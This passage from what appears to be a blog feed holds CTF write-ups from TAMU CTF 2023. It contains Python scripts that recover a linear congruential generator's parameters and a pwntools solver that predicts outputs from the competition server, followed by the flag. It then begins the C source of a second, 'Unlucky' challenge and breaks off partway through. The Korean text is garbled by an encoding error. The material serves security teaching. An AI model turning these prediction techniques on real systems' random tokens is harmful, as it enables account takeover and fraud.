class="number">5178043290332802954</span>, <span class="number">6796849632481923191</span>, <span class="number">7814022798513909848</span>, <span class="number">4211994959882782717</span>, <span class="number">13926491126268733302</span>, <span class="number">1697195879645913875</span>, <span class="number">6426051253310747748</span>, <span class="number">675678709412355897</span>],</span><br><span class="line">[<span class="number">10444205669711294678</span>, <span class="number">1227172335406819827</span>, <span class="number">10887914848232361668</span>, <span class="number">13396361579650890521</span>, <span class="number">2011745310433865218</span>, <span class="number">9683217903969838799</span>, <span class="number">4059248720375019024</span>, <span class="number">3387000600233038485</span>, <span class="number">12342112531565036142</span>, <span class="number">3055537287348119531</span>],</span><br><span class="line">[<span class="number">17779609461642040498</span>, <span class="number">9307943988470387775</span>, <span class="number">15058836698332001600</span>, <span class="number">6042064057173219973</span>, <span class="number">11074050323342042654</span>, <span class="number">7792965288509326939</span>, <span class="number">2759026769566561996</span>, <span class="number">5905406362997261633</span>, <span class="number">1644669425200917194</span>, <span class="number">2801725896605976759</span>],</span><br><span class="line">[<span class="number">13662389174465413016</span>, <span class="number">1920905278926365757</span>, <span class="number">3415255729952375990</span>, <span class="number">14291716482199323987</span>, <span class="number">8451001365147119524</span>, <span class="number">11270027910155147129</span>, <span class="number">2868674704903984098</span>, <span class="number">13471113901279386671</span>, <span class="number">7169655502800099568</span>, <span class="number">15090883776758528245</span>],</span><br><span class="line">[<span class="number">4833394564540976836</span>, <span class="number">1462831626555472665</span>, <span class="number">8701661863779855874</span>, <span class="number">10118858242104403663</span>, <span class="number">15671687977950443024</span>, <span class="number">11435314203426574997</span>, <span class="number">14273428940632506990</span>, <span class="number">7189160997036746731</span>, <span class="number">16436762879087182492</span>, <span class="number">8885250160732943441</span>],</span><br><span class="line">[<span class="number">10230397123600839054</span>, <span class="number">4921126727494933387</span>, <span class="number">7516350870378474684</span>, <span class="number">2119375992247308017</span>, <span class="number">17109734949097391930</span>, <span class="number">18426834844018291431</span>, <span class="number">17073007225012598920</span>, <span class="number">15892621882167573741</span>, <span class="number">8233009520699042854</span>, <span class="number">14675334716947408515</span>],</span><br><span class="line">[<span class="number">6982897219557017034</span>, <span class="number">2204562232985833399</span>, <span class="number">4540841486346091672</span>, <span class="number">18170157378527499581</span>, <span class="number">17809006179857512886</span>, <span class="number">11336317545337982547</span>, <span class="number">7442659532519627940</span>, <span class="number">15481417753696434297</span>, <span class="number">16753412803609524450</span>, <span class="number">12287350879064986927</span>],</span><br><span class="line">[<span class="number">12335665912060183356</span>, <span class="number">2610720541513277297</span>, <span class="number">14119020701030169018</span>, <span class="number">14981736538184978279</span>, <span class="number">722153007028610824</span>, <span class="number">12935069337555043693</span>, <span class="number">7076068753239537318</span>, <span class="number">8633398057079732995</span>, <span class="number">5408655579795925012</span>, <span class="number">4262353531727793577</span>],</span><br><span class="line">[<span class="number">4267092785397013934</span>, <span class="number">17728241086750687275</span>, <span class="number">5763526120967015388</span>, <span class="number">10301676798823477905</span>, <span class="number">9839424317857014106</span>, <span class="number">14837491278590115207</span>, <span class="number">9215974168692610472</span>, <span class="number">8712919133665367693</span>, <span class="number">10895609864204719174</span>, <span class="number">13927317681743558435</span>],</span><br><span class="line">[<span class="number">15352056503978231050</span>, <span class="number">7827486573053500407</span>, <span class="number">5140995403114531288</span>, <span class="number">4240545414421178237</span>, <span class="number">15896472489418024182</span>, <span class="number">8498701420980123283</span>, <span class="number">14561331762632406500</span>, <span class="number">8607711641320261305</span>, <span class="number">3636292892392378402</span>, <span class="number">11096536616849938799</span>],</span><br><span class="line">[<span class="number">17027027727640810764</span>, <span class="number">12720036563514190977</span>, <span class="number">10685551418130251530</span>, <span class="number">17880028976314842615</span>, <span class="number">16236890500893733848</span>, <span class="number">13540800139094538621</span>, <span class="number">11978005912045584118</span>, <span class="number">14825668687925033107</span>, <span class="number">8400215412801945572</span>, <span class="number">7765797198338144441</span>],</span><br><span class="line">[<span class="number">15021933103315449546</span>, <span class="number">3495716001031128247</span>, <span class="number">1396731112923678104</span>, <span class="number">4140726423186031165</span>, <span class="number">9008962094192876214</span>, <span class="number">12875830066893255507</span>, <span class="number">2988559077576152484</span>, <span class="number">3296391541949453689</span>, <span class="number">6090087509997685218</span>, <span class="number">14387668568230144559</span>],</span><br><span class="line">[<span class="number">7157414067549684176</span>, <span class="number">14246224744479866197</span>, <span class="number">5312071462504532014</span>, <span class="number">16044793512331228331</span>, <span class="number">286107928281657948</span>, <span class="number">1294702977724846865</span>, <span class="number">15547529168176227290</span>, <span class="number">2868356329005689351</span>, <span class="number">13449145964297049128</span>, <span class="number">5653867851018809101</span>],</span><br><span class="line">[<span class="number">7374594347533511120</span>, <span class="number">10784919989654373717</span>, <span class="number">6289716337769721902</span>, <span class="number">9715313610791124139</span>, <span class="number">6273852491043707484</span>, <span class="number">8620708186696129297</span>, <span class="number">4533054523327269850</span>, <span class="number">17632856930228793863</span>, <span class="number">17628763394665921576</span>, <span class="number">17346309440827733773</span>],</span><br><span class="line">[<span class="number">2342052956166955452</span>, <span class="number">14027701385843513329</span>, <span class="number">8680703790305735738</span>, <span class="number">8672751172390114279</span>, <span class="number">8124020536212233608</span>, <span class="number">7155094787357570541</span>, <span class="number">14086194411224025382</span>, <span class="number">12716722541561067395</span>, <span class="number">10456883903364724372</span>, <span class="number">2101970457493468713</span>],</span><br><span class="line">[<span class="number">4772590411956129490</span>, <span class="number">15714089171910557407</span>, <span class="number">14360996586674467424</span>, <span class="number">13231328573932016677</span>, <span class="number">9071211989541121598</span>, <span class="number">17171072845922187003</span>, <span class="number">4212405651219599852</span>, <span class="number">13954828828509115617</span>, <span class="number">3652497334232293610</span>, <span class="number">12214643103804088151</span>],</span><br><span class="line">[<span class="number">7024552045636262550</span>, <span class="number">5078745232453774003</span>, <span class="number">18392027712538477188</span>, <span class="number">14671315152905416153</span>, <span class="number">16196565570157927362</span>, <span class="number">10758379918323891087</span>, <span class="number">4458451415966420432</span>, <span class="number">12485242522330184021</span>, <span class="number">12931506650143323182</span>, <span class="number">6830243321830822059</span>],</span><br><span class="line">[<span class="number">8964158918272436998</span>, <span class="number">9784410928382949603</span>, <span class="number">11041567404879664500</span>, <span class="number">5551643914605234313</span>, <span class="number">14128548633570135346</span>, <span class="number">15639163883442654911</span>, <span class="number">9191151682389195200</span>, <span class="number">7000167578729713925</span>, <span class="number">3396217015901918878</span>, <span class="number">12978045212717783259</span>],</span><br><span class="line">[<span class="number">930350092441786838</span>, <span class="number">8853924157354637043</span>, <span class="number">2178212425054752708</span>, <span class="number">2722704739101523993</span>, <span class="number">3399186260909639426</span>, <span class="number">13182923118250501071</span>, <span class="number">5731235547516544784</span>, <span class="number">8073627230741006229</span>, <span class="number">3677956709842881390</span>, <span class="number">13971340020934644971</span>],</span><br><span class="line">[<span class="number">8133993277912905324</span>, <span class="number">7843213964703918945</span>, <span class="number">6226185426993410410</span>, <span class="number">5331680767225631191</span>, <span class="number">17397835538087071544</span>, <span class="number">1412287336887081565</span>, <span class="number">5214105876660869974</span>, <span class="number">9285168089118547571</span>, <span class="number">13487299643055027524</span>, <span class="number">8286471685319318425</span>],</span><br><span class="line">[<span class="number">9877798999468753552</span>, <span class="number">17485344309800136981</span>, <span class="number">7450392585088596718</span>, <span class="number">16014998380955279979</span>, <span class="number">16676987937050773276</span>, <span class="number">7014035086511155921</span>, <span class="number">4353075052821416602</span>, <span class="number">5214273465324919751</span>, <span class="number">9296731706937982184</span>, <span class="number">14285189272596015821</span>],</span><br><span class="line">[<span class="number">13345670530455246326</span>, <span class="number">16960806989643967379</span>, <span class="number">8150805641731997412</span>, <span class="number">9003267068221273017</span>, <span class="number">12482873274852634914</span>, <span class="number">12768028574192434799</span>, <span class="number">13997000154929075248</span>, <span class="number">6562318857209508149</span>, <span class="number">10078143378426823566</span>, <span class="number">12862362384197416331</span>],</span><br><span class="line">[<span class="number">3527923150139187946</span>, <span class="number">3619024401379797335</span>, <span class="number">9905010736981845176</span>, <span class="number">916210124493907421</span>, <span class="number">7878266368950957270</span>, <span class="number">8644801320039054835</span>, <span class="number">6195480723989131972</span>, <span class="number">3213056259930418969</span>, <span class="number">339953050684289538</span>, <span class="number">5010016423506426575</span>],</span><br><span class="line">[<span class="number">2251345810918236694</span>, <span class="number">7768908363681919027</span>, <span class="number">1099098956475416068</span>, <span class="number">2050851701965502297</span>, <span class="number">12381558919652797250</span>, <span class="number">5777338065403635983</span>, <span class="number">11254700964950298960</span>, <span class="number">1811115485769460437</span>, <span class="number">14286504075835460526</span>, <span class="number">8091345326040540715</span>],</span><br><span class="line">[<span class="number">16278112069030549596</span>, <span class="number">16385088340534825233</span>, <span class="number">5319707000620292570</span>, <span class="number">16571645642318706695</span>, <span class="number">18192160823708113448</span>, <span class="number">880499823610318093</span>, <span class="number">5414255607983293638</span>, <span class="number">4648755476656228771</span>, <span class="number">7169478636217407796</span>, <span class="number">15078679982552795977</span>],</span><br><span class="line">[<span class="number">426316868124203456</span>, <span class="number">10969119826860486917</span>, <span class="number">552761031281981086</span>, <span class="number">1247023011037591771</span>, <span class="number">12257611466755625804</span>, <span class="number">15671707889208357825</span>, <span class="number">11436688080222696266</span>, <span class="number">14368226439564874551</span>, <span class="number">13730188423370108440</span>, <span class="number">6599053453350350013</span>],</span><br><span class="line">[<span class="number">13150327040177579016</span>, <span class="number">3482106160484922989</span>, <span class="number">457652115235515302</span>, <span class="number">13131251877541004291</span>, <span class="number">2165919938561266964</span>, <span class="number">1874523171051007657</span>, <span class="number">214890286552667090</span>, <span class="number">14827429772134029279</span>, <span class="number">8521730223222681440</span>, <span class="number">16150319117368919333</span>],</span><br><span class="line">[<span class="number">9685667656530826836</span>, <span class="number">4228281647083193577</span>, <span class="number">15050272543097082642</span>, <span class="number">5451137345963811871</span>, <span class="number">7193595397311986848</span>, <span class="number">16742736498078750565</span>, <span class="number">11550685797441588862</span>, <span class="number">3787324853958912059</span>, <span class="number">3070997891231209516</span>, <span class="number">8984669684148388897</span>],</span><br><span class="line">[<span class="number">14752986476655224134</span>, <span class="number">3385142835185126435</span>, <span class="number">12213926743259104692</span>, <span class="number">12657461967948401097</span>, <span class="number">6367904324090749810</span>, <span class="number">15110284666942049791</span>, <span class="number">9591973891266545152</span>, <span class="number">16210155917557308997</span>, <span class="number">11696113888881223902</span>, <span class="number">13821863163293729819</span>],</span><br><span class="line">[<span class="number">4848477814157730098</span>, <span class="number">2503575850111447743</span>, <span class="number">6726036994303929792</span>, <span class="number">2927950764232365317</span>, <span class="number">17561161994937690782</span>, <span class="number">12681812859579808987</span>, <span class="number">8048115846657894220</span>, <span class="number">1917671208108152769</span>, <span class="number">3192104843495679818</span>, <span class="number">17341049390396839735</span>],</span><br><span class="line">[<span class="number">15624023056168666090</span>, <span class="number">8146434600483966551</span>, <span class="number">8701665222107143608</span>, <span class="number">10119089966687257309</span>, <span class="number">15687676974167344598</span>, <span class="number">12538554942392783603</span>, <span class="number">16610063634462694340</span>, <span class="number">2396258207933709337</span>, <span class="number">17767863757749531394</span>, <span class="number">8497490419887259599</span>],</span><br><span class="line">[<span class="number">9904744802680554204</span>, <span class="number">897860657704830353</span>, <span class="number">6612153160504639578</span>, <span class="number">13516710305790892167</span>, <span class="number">10315807414093978792</span>, <span class="number">10814436771521575309</span>, <span class="number">8326374286606631750</span>, <span class="number">2670759490861490723</span>, <span class="number">18261708206056895412</span>, <span class="number">5679269205676273609</span>],</span><br><span class="line">[<span class="number">4386764090407132678</span>, <span class="number">7538817058739328995</span>, <span class="number">3669542989146255476</span>, <span class="number">13390793292867456905</span>, <span class="number">1627533522376945714</span>, <span class="number">1619348601751944639</span>, <span class="number">1054589078626870464</span>, <span class="number">17426414204125407237</span>, <span class="number">3384215293532244382</span>, <span class="number">12149926369210243035</span>],</span><br><span class="line">[<span class="number">9075652399451677632</span>, <span class="number">17477461129750553349</span>, <span class="number">6906453161667326110</span>, <span class="number">15376666312306711259</span>, <span class="number">9525563347718634828</span>, <span class="number">11627828412751496641</span>, <span class="number">9110165310342548810</span>, <span class="number">1412107907511113015</span>, <span class="number">5201725249719040024</span>, <span class="number">8430904830132281021</span>],</span><br><span class="line">[<span class="number">15464708125926866968</span>, <span class="number">15600448487509378749</span>, <span class="number">6519789362993140022</span>, <span class="number">7143608277497422803</span>, <span class="number">13293625230873831460</span>, <span class="number">13369681318526341625</span>, <span class="number">170807292839991394</span>, <span class="number">11785703205959406255</span>, <span class="number">1556781967978760560</span>, <span class="number">15184235421986720629</span>],</span><br><span class="line">[<span class="number">7629119045957438128</span>, <span class="number">9900380107195785653</span>, <span class="number">596696669255800334</span>, <span class="number">4278582031231119883</span>, <span class="number">74254975594446140</span>, <span class="number">5123593316016783729</span>, <span class="number">3039801404676596666</span>, <span class="number">6832112111880102247</span>, <span class="number">10247133876988264712</span>, <span class="number">6075962711227303789</span>],</span><br><span class="line">[<span class="number">6336908066116601936</span>, <span class="number">12971542866725846485</span>, <span class="number">9592742266024929966</span>, <span class="number">16263173775885861163</span>, <span class="number">15354346113551323356</span>, <span class="number">7985469633596869521</span>, <span class="number">16041826580607000154</span>, <span class="number">81389639309913735</span>, <span class="number">5615885112384047784</span>, <span class="number">114447206598713229</span>],</span><br><span class="line">[<span class="number">11040999432439563636</span>, <span class="number">5512453816238274697</span>, <span class="number">11424431846249921842</span>, <span class="number">13522546295443439295</span>, <span class="number">10718490700119730624</span>, <span class="number">1706095359879348485</span>, <span class="number">7040115389417735838</span>, <span class="number">6152615953375430875</span>, <span class="number">255387087585043276</span>, <span class="number">17621709043367986113</span>],</span><br><span class="line">[<span class="number">14957465477493635322</span>, <span class="number">17494193893035498407</span>, <span class="number">8061013828328535112</span>, <span class="number">2807631943382374317</span>, <span class="number">9259163356288311782</span>, <span class="number">11692973077768758083</span>, <span class="number">13605147196533588308</span>, <span class="number">16417952875340012521</span>, <span class="number">7587359902178215442</span>, <span class="number">7018999186429420319</span>],</span><br><span class="line">[<span class="number">4160247362847484440</span>, <span class="number">10355906930833152189</span>, <span class="number">13581303426524539702</span>, <span class="number">14772732744715658707</span>, <span class="number">4747635331355111972</span>, <span class="number">13992188610440348665</span>, <span class="number">6230322287487373922</span>, <span class="number">5617124141309113519</span>, <span class="number">199940202428248944</span>, <span class="number">13795873967549177205</span>],</span><br><span class="line">[<span class="number">9602519741905125674</span>, <span class="number">16937819611619365015</span>, <span class="number">6564676558034434296</span>, <span class="number">10240824735346727709</span>, <span class="number">5640631937961250582</span>, <span class="number">1821978171425706291</span>, <span class="number">15036029386116424452</span>, <span class="number">4468359514298396761</span>, <span class="number">13168901307236550722</span>, <span class="number">4763730587553970703</span>],</span><br><span class="line">[<span class="number">7373837261793968386</span>, <span class="number">10732681073625925071</span>, <span class="number">2685231131806765328</span>, <span class="number">813507357571291541</span>, <span class="number">791775451290461550</span>, <span class="number">17739017991622743787</span>, <span class="number">6507132557138914716</span>, <span class="number">6270288673555876689</span>, <span class="number">8374804780035804442</span>, <span class="number">6012463537474406471</span>],</span><br><span class="line">[<span class="number">2329707387181522384</span>, <span class="number">13175857125848631637</span>, <span class="number">5243682071787553838</span>, <span class="number">11325925552859734187</span>, <span class="number">6725612051520491100</span>, <span class="number">2898629712175095569</span>, <span class="number">15538009402986078170</span>, <span class="number">2211492530885400071</span>, <span class="number">5019032041416192040</span>, <span class="number">14271817530945321741</span>],</span><br><span class="line">[<span class="number">8739309380112934642</span>, <span class="number">12716536869086838655</span>, <span class="number">10444072502642941312</span>, <span class="number">1217983807690437573</span>, <span class="number">10253906435801986142</span>, <span class="number">6543269269374082459</span>, <span class="number">8763721817782450956</span>, <span class="number">14400995068283464321</span>, <span class="number">15991223804952802570</span>, <span class="number">15036542192879832055</span>],</span><br><span class="line">[<span class="number">3358427551366085530</span>, <span class="number">10370572159745282247</span>, <span class="number">14593204221461513704</span>, <span class="number">10806911300528658381</span>, <span class="number">7807116788095363718</span>, <span class="number">3735480241003099747</span>, <span class="number">17940463670989711604</span>, <span class="number">1960140359750142473</span>, <span class="number">6122476306792969394</span>, <span class="number">16622495547104752703</span>],</span><br><span class="line">[<span class="number">8362192087476912076</span>, <span class="number">5142187750910833217</span>, <span class="number">4322817412366011338</span>, <span class="number">3126496273901956535</span>, <span class="number">12814058088429933208</span>, <span class="number">17173036637316465469</span>, <span class="number">4347907257424814006</span>, <span class="number">4857695582959340627</span>, <span class="number">3139601897422574244</span>, <span class="number">13718346111352555129</span>],</span><br><span class="line">[<span class="number">9637178809775025514</span>, <span class="number">882551220932902359</span>, <span class="number">5555802023241607992</span>, <span class="number">14415458129479919197</span>, <span class="number">16989175027508189014</span>, <span class="number">10108200254363290227</span>, <span class="number">14936286823813615940</span>, <span class="number">16032866789114161049</span>, <span class="number">17909908100013567106</span>, <span class="number">18298550036105723727</span>],</span><br><span class="line">[<span class="number">18157426400011258858</span>, <span class="number">16930568662236902999</span>, <span class="number">6064361050644555192</span>, <span class="number">12612542872864172765</span>, <span class="number">3268486763278994902</span>, <span class="number">4164657781736028915</span>, <span class="number">10660225834142720964</span>, <span class="number">16132563681175233561</span>, <span class="number">6342249578518018818</span>, <span class="number">13340107222423611343</span>],</span><br><span class="line">[<span class="number">207789459502672138</span>, <span class="number">14337472705684377591</span>, <span class="number">11608180785615818200</span>, <span class="number">7754479037980736381</span>, <span class="number">103475483093813494</span>, <span class="number">7139808333473131155</span>, <span class="number">13031429093197707748</span>, <span class="number">13724891892583357113</span>, <span class="number">6233592829064508450</span>, <span class="number">5842791510131395951</span>],</span><br><span class="line">[<span class="number">3441518153478150654</span>, <span class="number">16103823705477775803</span>, <span class="number">4359191255393433516</span>, <span class="number">5636291442794086817</span>, <span class="number">1522484004891406506</span>, <span class="number">12817675968959290903</span>, <span class="number">17422670393842146424</span>, <span class="number">3125892383987248285</span>, <span class="number">12772389684315063958</span>, <span class="number">14297916753390487219</span>],</span><br><span class="line">[<span class="number">16496674539259128832</span>, <span class="number">13019154712597240901</span>, <span class="number">12877959631151144670</span>, <span class="number">3135499011370504731</span>, <span class="number">13435246973759758732</span>, <span class="number">4694837503945771777</span>, <span class="number">10349138519195875210</span>, <span class="number">13114283023552428151</span>, <span class="number">995069013349513304</span>, <span class="number">13319529699987763197</span>],</span><br><span class="line">[<span class="number">18053129989247845630</span>, <span class="number">9734116319561390267</span>, <span class="number">7571239396192070316</span>, <span class="number">5906684273385406625</span>, <span class="number">1732845241982921642</span>, <span class="number">8885857254564283671</span>, <span class="number">4381596132520370040</span>, <span class="number">7182227964552706973</span>, <span class="number">15958383637688439190</span>, <span class="number">12770570651638758835</span>],</span><br><span class="line">[<span class="number">19529414742290256</span>, <span class="number">1347529617218027733</span>, <span class="number">745823219496155566</span>, <span class="number">14568313997815630891</span>, <span class="number">9089485868962744284</span>, <span class="number">18431970526014152337</span>, <span class="number">17427369282727001434</span>, <span class="number">3450115717042243975</span>, <span class="number">16697055591400214952</span>, <span class="number">8398703236622631565</span>],</span><br><span class="line">[<span class="number">13962790238404640136</span>, <span class="number">4201834617023485421</span>, <span class="number">13225427468977219878</span>, <span class="number">8664035747660142467</span>, <span class="number">7522656229844178580</span>, <span class="number">2554445795380876841</span>, <span class="number">10236063217894537554</span>, <span class="number">5312087233760129887</span>, <span class="number">16045881728967481568</span>, <span class="number">361194876183131301</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">reduce = functools.reduce</span><br><span class="line">gcd = math.gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">b, n</span>):</span><br><span class="line">    g, x, _ = egcd(b, n)</span><br><span class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> x % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span><br><span class="line">    <span class="comment"># print(&#x27;states&#x27;, states)</span></span><br><span class="line">    <span class="comment"># print(&#x27;modulus&#x27;, modulus)</span></span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_modulus</span>(<span class="params">states</span>):</span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> values <span class="keyword">in</span> value_arr:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m, c, a = crack_unknown_modulus(values[:<span class="number">5</span>])</span><br><span class="line">        <span class="built_in">print</span>(m, c, a)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><ul><li><code>solve.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># p.recvline()</span></span><br><span class="line"><span class="comment"># seed = []</span></span><br><span class="line"><span class="comment"># for i in range(10):</span></span><br><span class="line"><span class="comment">#     seed.append(int(p.recvline(), 10))</span></span><br><span class="line"><span class="comment"># print(repr(seed))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line">m = <span class="number">18446744073709551616</span></span><br><span class="line">c = <span class="number">69</span></span><br><span class="line">a = <span class="number">69</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rand</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.m = m</span><br><span class="line">        self.a = a</span><br><span class="line">        self.c = c</span><br><span class="line">        self.seed = seed</span><br><span class="line">        <span class="keyword">if</span> seed % <span class="number">2</span> == <span class="number">0</span>: <span class="comment"># initial state must be odd</span></span><br><span class="line">            self.seed += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.c) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;prng&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">values = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    values.append(<span class="built_in">int</span>(p.recvline(), <span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">prng = Rand(values[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(prng.rand())</span><br><span class="line"><span class="comment"># print(values[-1])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># p.close()</span></span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;D0nt_r0ll_y0uR_oWn_RnG&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> z3 </tag>
            
            <tag> crypto </tag>
            
            <tag> prng </tag>
            
            <tag> lcg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Unlocky (pwn, seed, rand)</title>
      <link href="/230503-tamu2023-2.Unlucky-pwn/"/>
      <url>/230503-tamu2023-2.Unlucky-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>Luck wonâ€™t save you here. Have fun trying to get the flag!<br>Author: nhwn</p></blockquote><ul><li>[102 solves &#x2F; 398 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë°”ì´ë„ˆë¦¬ì™€ cíŒŒì¼ì„ ì¤€ë‹¤. ì¹œì ˆí•˜ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> seed = <span class="number">69</span>;</span><br><span class="line">    srand(&amp;seed);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a lucky number: %p\n&quot;</span>, &amp;main);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> lol = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">7</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter lucky number #%d:\n&quot;</span>, i);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">        <span class="keyword">if</span> (rand() != input) &#123;</span><br><span class="line">            lol = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lol) &#123;</span><br><span class="line">        <span class="type">char</span> flag[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        FILE* f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span 